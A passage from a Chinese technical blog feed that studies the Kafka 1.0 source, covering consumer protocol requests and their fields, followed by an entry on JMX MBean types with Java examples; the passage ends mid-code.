    <content type="html"><![CDATA[<h2 id="消费消息的请求-按序"><a href="#消费消息的请求-按序" class="headerlink" title="消费消息的请求(按序)"></a>消费消息的请求(按序)</h2><ul><li>org/apache/kafka/common/requests/RequestHeader  </li><li>org/apache/kafka/common/requests/ApiVersionsRequest  </li><li>org/apache/kafka/common/requests/MetadataRequest  批量查询topic的元数据信息  </li><li>org/apache/kafka/common/requests/FindCoordinatorRequest    从拿到的topic的元数据中取出leader节点 作为组协调者  </li><li>org/apache/kafka/common/requests/JoinGroupRequest  </li><li>org/apache/kafka/common/requests/SyncGroupRequest  </li><li>org/apache/kafka/common/requests/OffsetFetchRequest  </li><li>org/apache/kafka/common/requests/ListOffsetRequest  </li><li>org/apache/kafka/common/requests/FetchRequest  </li><li>org/apache/kafka/common/requests/HeartbeatRequest   </li></ul><p><a href="https://www.cnblogs.com/simoncook/p/11317367.html" target="_blank" rel="noopener">请求接口文档参考</a><br><a href="https://www.cnblogs.com/simoncook/p/11317477.html" target="_blank" rel="noopener">响应接口文档参考</a>  </p><h2 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="RequestHeader"></a>RequestHeader</h2><p>请求头  </p><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>api_key</td><td>INT16</td><td>null</td><td>请求接口编号</td></tr><tr><td>api_version</td><td>INT16</td><td>null</td><td>api版本</td></tr><tr><td>correlation_id</td><td>INT32</td><td>null</td><td>用户提供的一个整数id，用于响应时由响应体带回来</td></tr><tr><td>client_id</td><td>NULLABLE_STRING</td><td>null</td><td>用户提供的client id</td></tr></table>  <h2 id="ApiVersionsRequest"><a href="#ApiVersionsRequest" class="headerlink" title="ApiVersionsRequest"></a>ApiVersionsRequest</h2><p>查询API版本信息  </p><h3 id="请求-version-1"><a href="#请求-version-1" class="headerlink" title="请求 version:1"></a>请求 version:1</h3><p>仅仅有请求头  </p><h3 id="响应-version-1"><a href="#响应-version-1" class="headerlink" title="响应 version:1"></a>响应 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>错误码</td></tr><tr><td>api_versions</td><td>ARRAY({api_key:INT16,min_version:INT16,max_version:INT16})</td><td>null</td><td>broker能支持的api各版本列表。含最低版本，最高版本.</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>由于配额冲突而阻止请求的持续时间（毫秒）（如果请求未违反任何配额，则为零</td></tr></table>  <p>虽是请求broker端，但是实际还是用的client中的API完成的逻辑：<br>ApiVersionsResponse.apiVersionsResponse<br>根据<code>messageFormatVersion</code> 消息格式版本推导出各API版本情况。<br>API版本 最小的是0 。写的固定的。  最大的是 requestSchemas的length -1 即requestSchemas最大版本。<br>此处不仅返回每个API的最小版本与最大版本，还返回能支持的API列表。如因版本问题不能支持的API是不会返回的。<br>能否支持的判断依据是，API依赖的最小消息格式版本小于当前的消息格式版本，那么就支持。  </p><pre><code class="hljs java"><span class="hljs-keyword">for</span> (ApiKeys apiKey : ApiKeys.values()) &#123;    <span class="hljs-keyword">if</span> (apiKey.minRequiredInterBrokerMagic &lt;= minMagic) &#123;        versionList.add(neApiVersionsResponse.ApiVersion(apiKey));    &#125;&#125;</code></pre><h2 id="MetadataRequest"><a href="#MetadataRequest" class="headerlink" title="MetadataRequest"></a>MetadataRequest</h2><p>批量查询topic的元数据信息  </p><h3 id="请求-version-5"><a href="#请求-version-5" class="headerlink" title="请求 version:5"></a>请求 version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>需要查元数据的topic的列表，如果不送则查所有topic的元数据</td></tr><tr><td>allow_auto_topic_creation</td><td>BOOLEAN</td><td>null</td><td>在broker配置了允许自动创建topic时是否自动创建topic</td></tr></table>  <h3 id="响应-version-4"><a href="#响应-version-4" class="headerlink" title="响应 version:4"></a>响应 version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>由于配额冲突而阻止请求的持续时间（毫秒）（如果请求未违反任何配额，则为零）</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>所有 活着的 broker的id ip port的信息</td></tr><tr><td>cluster_id</td><td>NULLABLE_STRING</td><td>null</td><td>集群id</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>controller角色的broker的id</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>topic元数据，分区数、leader broker的id、副本所在broker id列表、isr broker id列表</td></tr></table>  <p>broker端处理<br>在broker端   </p><ol><li>过滤出授权的topics KafkaApis.handleTopicMetadataRequest  </li><li>查询出授权topics的元数据  KafkaApis.getTopicMetadata  </li><li>1 从缓存中拿，拿到(跟topics的size相同)即返回  </li><li>2 处理没拿到的topic  </li><li>2.1 允许创建topic的，就按默认副本数和默认分区数创建，不能创建的或者创建出错的返回出错信息。创建topic前提是协调者可用。否则COORDINATOR_NOT_AVAILABLE。  </li><li>2.2 返回创建后的metadata<br>元数据信息有缓存 <code>kafka.server.MetadataCache.cache</code>：topic &lt;–&gt; [partitionNo &lt;–&gt; 分区状态封装]<br><code>MetadataCache</code>中一系列getxxx方法都是用来读取检索的。<br>元数据缓存的更新参见 《MetadataCache更新》  </li></ol><h2 id="FindCoordinatorRequest"><a href="#FindCoordinatorRequest" class="headerlink" title="FindCoordinatorRequest"></a>FindCoordinatorRequest</h2><p>查询协调者  </p><h3 id="请求-version-1-1"><a href="#请求-version-1-1" class="headerlink" title="请求 version:1"></a>请求 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>coordinator_key</td><td>STRING</td><td>null</td><td>组协调时是组id<br>事务协调时是事务id</td></tr><tr><td>coordinator_type</td><td>INT8</td><td>null</td><td>协调类型(0 = group, 1 = transaction)</td></tr></table>  <h3 id="响应-version-1-1"><a href="#响应-version-1-1" class="headerlink" title="响应 version:1"></a>响应 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>error_message</td><td>NULLABLE_STRING</td><td>null</td><td>Response error message</td></tr><tr><td>coordinator</td><td>{node_id:INT32,host:STRING,port:INT32}</td><td>null</td><td>协调者broker的id ip port</td></tr></table>  <p>组协调与事务协调都用这个请求<br>coordinatorKey 组协调是组id  事务协调时是事务id<br>分区对应的leader节点就是组协调者  </p><pre><code class="hljs scala"><span class="hljs-keyword">val</span> coordinatorEndpoint = topicMetadata.partitionMetadata.asScala   .find(_.partition == partition)   .map(_.leader) <span class="hljs-comment">// SimonNote: leader节点作为协调者</span></code></pre><p>这个请求的响应也就是将协调者信息(node_id，host，port)返回去  </p><h2 id="JoinGroupRequest"><a href="#JoinGroupRequest" class="headerlink" title="JoinGroupRequest"></a>JoinGroupRequest</h2><p>加入消费组的请求  </p><h3 id="请求-version-2"><a href="#请求-version-2" class="headerlink" title="请求 version:2"></a>请求 version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>唯一的组标志</td></tr><tr><td>session_timeout</td><td>INT32</td><td>null</td><td>会话时间，超过这个时间没收到心跳，协调者就认为这个消费者挂了</td></tr><tr><td>rebalance_timeout</td><td>INT32</td><td>null</td><td>协调者在重新平衡组时等待每个成员重新加入的最长时间</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>由组协调者分配的成员ID，如果是第一次加入，则为空。</td></tr><tr><td>protocol_type</td><td>STRING</td><td>null</td><td>组协调协议实现类的唯一名称</td></tr><tr><td>group_protocols</td><td>ARRAY({protocol_name:STRING,protocol_metadata:BYTES})</td><td>null</td><td>组成员能支持的组协调协议列表</td></tr></table>  <h3 id="响应-version-2"><a href="#响应-version-2" class="headerlink" title="响应 version:2"></a>响应 version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>组的年代？</td></tr><tr><td>group_protocol</td><td>STRING</td><td>null</td><td>协调者选中的组协议</td></tr><tr><td>leader_id</td><td>STRING</td><td>null</td><td>组中的leader</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>第一次加入的时候组协调者给分的成员id</td></tr><tr><td>members</td><td>ARRAY({member_id:STRING,member_metadata:BYTES})</td><td>null</td><td>组内成员？</td></tr></table>  <h3 id="kafka-coordinator-group-GroupCoordinator-handleJoinGroup"><a href="#kafka-coordinator-group-GroupCoordinator-handleJoinGroup" class="headerlink" title="kafka.coordinator.group.GroupCoordinator.handleJoinGroup"></a>kafka.coordinator.group.GroupCoordinator.handleJoinGroup</h3><h4 id="一系列的check"><a href="#一系列的check" class="headerlink" title="一系列的check:"></a>一系列的check:</h4><ol><li>协调者是否可用   </li><li>是否是本分区的协调者   </li><li>消费组id是否合法(是否为空)    </li><li>是否协调者正在load中，<code>GroupMetadataManager</code>会管理当前partition是否在load中  </li><li>sessionTimeoutMs是否在组配置的最大最小范围内  </li></ol><p>向<code>groupManager</code>加入新建的<code>GroupMetadata</code>实例(如果没有的话，有就直接下一步了),<code>GroupMetadata</code>有哪些东西，下面注释写了一部分，但是还包含事务消息用一些offset   </p><pre><code class="hljs scala"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Group contains the following metadata:</span><span class="hljs-comment"> *</span><span class="hljs-comment"> *  Membership metadata:</span><span class="hljs-comment"> *  1. Members registered in this group</span><span class="hljs-comment"> *  2. Current protocol assigned to the group (e.g. partition assignment strategy for consumers)</span><span class="hljs-comment"> *  3. Protocol metadata associated with group members</span><span class="hljs-comment"> *</span><span class="hljs-comment"> *  State metadata:</span><span class="hljs-comment"> *  1. group state</span><span class="hljs-comment"> *  2. generation id</span><span class="hljs-comment"> *  3. leader id</span><span class="hljs-comment"> */</span></code></pre><h4 id="doJoinGroup"><a href="#doJoinGroup" class="headerlink" title="doJoinGroup"></a><code>doJoinGroup</code></h4><p>一系列的check后，根据<code>group.currentState</code>做相应处理<br><code>group.currentState</code>  </p><p><code>GroupMetadata.scala</code>中有对group状态定义及action及走向到哪的明确详细描述，<strong>非常重要</strong>     </p><h2 id="SyncGroupRequest"><a href="#SyncGroupRequest" class="headerlink" title="SyncGroupRequest"></a>SyncGroupRequest</h2><h3 id="请求-version-1-2"><a href="#请求-version-1-2" class="headerlink" title="请求 version:1"></a>请求 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>group唯一标志</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>代的标志？</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>第一次加入的时候组协调者给分的成员id</td></tr><tr><td>group_assignment</td><td>ARRAY({member_id:STRING,member_assignment:BYTES})</td><td>null</td><td>null</td></tr></table>  <h3 id="响应-version-1-2"><a href="#响应-version-1-2" class="headerlink" title="响应 version:1"></a>响应 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>member_assignment</td><td>BYTES</td><td>null</td><td>null</td></tr></table>  <h2 id="OffsetFetchRequest"><a href="#OffsetFetchRequest" class="headerlink" title="OffsetFetchRequest"></a>OffsetFetchRequest</h2><h3 id="请求-version-3"><a href="#请求-version-3" class="headerlink" title="请求 version:3"></a>请求 version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>group id</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32})})</td><td>null</td><td>topic列表，支持多个topic</td></tr></table>  <h3 id="响应-version-3"><a href="#响应-version-3" class="headerlink" title="响应 version:3"></a>响应 version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING,error_code:INT16})})</td><td>null</td><td>列表：topic-[{分区号-offset，元数据信息}]</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="ListOffsetRequest"><a href="#ListOffsetRequest" class="headerlink" title="ListOffsetRequest"></a>ListOffsetRequest</h2><h3 id="请求-version-2-1"><a href="#请求-version-2-1" class="headerlink" title="请求 version:2"></a>请求 version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>follower的broker的id. 正常消费用-1.</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>事务消息可见性设置。 使用 READ_UNCOMMITTED (isolation_level = 0)能看到所有消息. 使用 READ_COMMITTED (isolation_level = 1), 非事务消息和已经提交的消息能被看到. 更具体一点, READ_COMMITTED 返回比当前 LSO (last stable offset)小的offset, 并允许返回已经取消的事务</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,timestamp:INT64})})</td><td>null</td><td>列表：topic,partitions{分区号，时间戳}</td></tr></table>  <h3 id="响应-version-2-1"><a href="#响应-version-2-1" class="headerlink" title="响应 version:2"></a>响应 version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,timestamp:INT64,offset:INT64})})</td><td>null</td><td>列表：topic 分区号 错误码 时间戳 offset</td></tr></table> <h2 id="FetchRequest"><a href="#FetchRequest" class="headerlink" title="FetchRequest"></a>FetchRequest</h2><h3 id="请求-version-6"><a href="#请求-version-6" class="headerlink" title="请求 version:6"></a>请求 version:6</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>follower的broker的id. 正常消费用-1</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>等待响应的最大时间 单位ms.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>最小字节</td></tr><tr><td>max_bytes</td><td>INT32</td><td>null</td><td>最大字节. 单条消息如果超过这个大小也将返回</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>事务隔离级别</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,log_start_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>列表： topic 分区号 取的offset log开始的 offset？？ 最大字节.</td></tr></table>  <h3 id="响应-version-6"><a href="#响应-version-6" class="headerlink" title="响应 version:6"></a>响应 version:6</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64,last_stable_offset:INT64,log_start_offset:INT64,aborted_transactions:ARRAY({producer_id:INT64,first_offset:INT64})},record_set:RECORDS})})</td><td>null</td><td>列表： topic 分区头: 分区号 高水位值 LSO(上次稳定offset)， log开始offset，取消事务：生产者id 第一个offset。 消息记录集</td></tr></table>  <h2 id="HeartbeatRequest"><a href="#HeartbeatRequest" class="headerlink" title="HeartbeatRequest"></a>HeartbeatRequest</h2><h3 id="请求-version-1-3"><a href="#请求-version-1-3" class="headerlink" title="请求 version:1"></a>请求 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>group id</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>group的年代</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>第一次加入的时候组协调者给分的成员id</td></tr></table>  <h3 id="响应-version-1-3"><a href="#响应-version-1-3" class="headerlink" title="响应 version:1"></a>响应 version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>响应码</td></tr></table>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>clients-producer-组包发送消息</title>
    <link href="/2020/04/22/kafka1-0-clietns-producer-semd-message/"/>
    <url>/2020/04/22/kafka1-0-clietns-producer-semd-message/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img2018.cnblogs.com/blog/127449/201911/127449-20191106232751318-1568618563.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>clients-producer-网络处理与请求响应对接部分</title>
    <link href="/2020/04/22/kafka1-0-clietns-producer/"/>
    <url>/2020/04/22/kafka1-0-clietns-producer/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img2018.cnblogs.com/blog/127449/201911/127449-20191106232834484-481719301.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JMX基本概念</title>
    <link href="/2020/04/22/jmx-basic/"/>
    <url>/2020/04/22/jmx-basic/</url>
    
    <content type="html"><![CDATA[<h3 id="Object-name的语法"><a href="#Object-name的语法" class="headerlink" title="Object name的语法"></a>Object name的语法</h3><ol><li>形似 com.sun.someapp:type=Whatsit,name=25  </li><li>com.sun.someapp 是domain，冒号后面的是key-property-list，每组kv的顺序随意，但是不能有空格，空格字符有特殊含义，不能有冒号。domain名不能含有冒号，不能含有/。  </li><li>key-property-list中的key支持<em>和？somedomain:type=Thread,</em>   </li><li>支持逗号连接多个值作为条件，com.sun.someapp:type=Whatsit,name=”25,26”  </li><li>整个Object name大小写敏感  </li><li>Object name预定之一 用java package的形式开头来命名  </li><li>每个对象名应该包含一个type= key 属性.<br>具体可以参见官方文档<a href="https://www.oracle.com/technetwork/java/javase/tech/best-practices-jsp-136021.html" target="_blank" rel="noopener">Java Management Extensions (JMX) - Best Practices</a></li></ol><h3 id="四种bean概念"><a href="#四种bean概念" class="headerlink" title="四种bean概念"></a>四种bean概念</h3><p>JMX标准提供了四种不同的 MBean：</p><ol><li>Standard MBean<br>Standard MBean是JMX管理构件中最简单的一种，只需要开发一个MBean接口（为了实现Standard MBean，必须遵循一套继承规范。必须<strong>每一个MBean定义一个接口</strong>，而且这个接口的名字必须是其被管理的资源的对象类的名称后面加上”MBean”），一个实现MBean接口的类，并且把它们注册到MBeanServer中就可以了。</li><li>Dynamic MBean<br>不再需要为没个bean定义接口了，可以实现javax.management.DynamicMBean做成通用的。tomcat大量使用。 用属性访问器动态地访问属性，并用一个一般化的 invoke() 方法调用方法。可用的方法是在 MBeanInfo 接口中指定的。这种方式更灵活，但是不具有像 Standard MBean 那样的类型安全性。它极大地降低了耦合性，可管理的 POJO（纯粹的老式 Java 对象）不需要实现特定的接口。</li><li>Model MBean<br>配合javax.management.modelmbean.RequiredModelMBean使用。提供了一个改进的抽象层，并扩展了 Dynamic MBean 模型以进一步减少对给定实现的依赖性。这对于可能使用多个版本的 JVM 或者需要用松散耦合管理第三方类的情况会有帮助。Dynamic MBean 与 Model MBean 之间的主要区别是，在 Model MBean 中有额外的元数据。</li><li>Open MBean<br>是受限的 Model MBean，它限制类型为固定的一组类型，以得到最大的可移植性。通过限制数据类型，可以使用更多的适配器，并且像 SMTP 这样的技术可以更容易适应 Java 应用程序的管理。这种变体还指定了数组和表等标准结构以改进复合对象的管理。</li></ol><h3 id="四种bean示例"><a href="#四种bean示例" class="headerlink" title="四种bean示例"></a>四种bean示例</h3><h4 id="Standard-MBean-示例"><a href="#Standard-MBean-示例" class="headerlink" title="Standard MBean 示例"></a>Standard MBean 示例</h4><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<span class="hljs-keyword">import</span> javax.management.InstanceAlreadyExistsException;<span class="hljs-keyword">import</span> javax.management.MBeanRegistrationException;<span class="hljs-keyword">import</span> javax.management.MBeanServer;<span class="hljs-keyword">import</span> javax.management.MBeanServerFactory;<span class="hljs-keyword">import</span> javax.management.MalformedObjectNameException;<span class="hljs-keyword">import</span> javax.management.NotCompliantMBeanException;<span class="hljs-keyword">import</span> javax.management.ObjectName;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 2019-11-16</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JMXMBeanTest</span> </span>&#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> args</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> MalformedObjectNameException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> NotCompliantMBeanException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> MBeanRegistrationException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> InstanceAlreadyExistsException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedObjectNameException, InstanceAlreadyExistsException,</span><span class="hljs-function">MBeanRegistrationException, NotCompliantMBeanException, IOException </span>&#123;MBeanServer mBeanServer = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (MBeanServerFactory.findMBeanServer(<span class="hljs-keyword">null</span>).size() &gt; <span class="hljs-number">0</span>) &#123;mBeanServer = MBeanServerFactory.findMBeanServer(<span class="hljs-keyword">null</span>).get(<span class="hljs-number">0</span>);&#125; <span class="hljs-keyword">else</span> &#123;mBeanServer = ManagementFactory.getPlatformMBeanServer();&#125;ObjectName jmxObjectName = <span class="hljs-keyword">new</span> ObjectName(<span class="hljs-string">"jxmstudy:name=HelloWord"</span>);Hello hello = <span class="hljs-keyword">new</span> Hello();hello.setName(<span class="hljs-string">"Simon"</span>);mBeanServer.registerMBean(hello, jmxObjectName);System.in.read();&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<span class="hljs-keyword">private</span> String name;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;&#125;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<span class="hljs-keyword">this</span>.name = name;&#125;&#125;&#125;</code></pre><h4 id="Dynamic-MBean示例"><a href="#Dynamic-MBean示例" class="headerlink" title="Dynamic MBean示例"></a>Dynamic MBean示例</h4><p>可以用 commons-modeler-2.0.1.jar完成，也可以参见tomcat的代码<br>具体做法是用配置文件描述mbean定义，然后走一个他自己开发的mbean公共机制完成注册，比如 org/apache/catalina/connector/mbeans-descriptors.xml 就是tomcat连接器jmx bean的描述。它有很多mbeans-descriptors.xml配置文件，针对不同组件各组件一个。<br><a href="https://www.iteye.com/blog/tyrion-2065129" target="_blank" rel="noopener">Tomcat7中的JMX使用（二）Dynamic MBean</a> 这篇文章分析了。  </p><h4 id="Model-MBean示例"><a href="#Model-MBean示例" class="headerlink" title="Model MBean示例"></a>Model MBean示例</h4><blockquote><p>————————————————<br>版权声明：本文为CSDN博主「朱小厮」的原创文章，遵循 CC 4.0 BY-SA   版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/u013256816/article/details/52817247" target="_blank" rel="noopener">https://blog.csdn.net/u013256816/article/details/52817247</a>  </p></blockquote><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.jmx.modelBean;<span class="hljs-keyword">import</span> javax.management.*;<span class="hljs-keyword">import</span> javax.management.modelmbean.*;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Created by hidden on 2016/10/9.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ModelMBeanUtils</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> READABLE = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> WRITABLE = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> BOOLEAN = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String STRING_CLASS = <span class="hljs-string">"java.lang.String"</span>;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> RequiredModelMBean <span class="hljs-title">createModelerMBean</span><span class="hljs-params">()</span> </span>&#123;        RequiredModelMBean model = <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">try</span> &#123;            model = <span class="hljs-keyword">new</span> RequiredModelMBean();            model.setManagedResource(<span class="hljs-keyword">new</span> Hello(), <span class="hljs-string">"ObjectReference"</span>);            ModelMBeanInfo info = createModelMBeanInfo();            model.setModelMBeanInfo(info);        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> model;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ModelMBeanInfo <span class="hljs-title">createModelMBeanInfo</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">//                        属性                                        //</span>        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">// 构造name属性信息</span>        Descriptor portAttrDesc = <span class="hljs-keyword">new</span> DescriptorSupport();        portAttrDesc.setField(<span class="hljs-string">"name"</span>, <span class="hljs-string">"Name"</span>);        portAttrDesc.setField(<span class="hljs-string">"descriptorType"</span>, <span class="hljs-string">"attribute"</span>);        portAttrDesc.setField(<span class="hljs-string">"displayName"</span>, <span class="hljs-string">"Name"</span>);        portAttrDesc.setField(<span class="hljs-string">"getMethod"</span>, <span class="hljs-string">"getName"</span>);        portAttrDesc.setField(<span class="hljs-string">"setMethod"</span>, <span class="hljs-string">"setName"</span>);        ModelMBeanAttributeInfo nameAttrInfo = <span class="hljs-keyword">new</span> 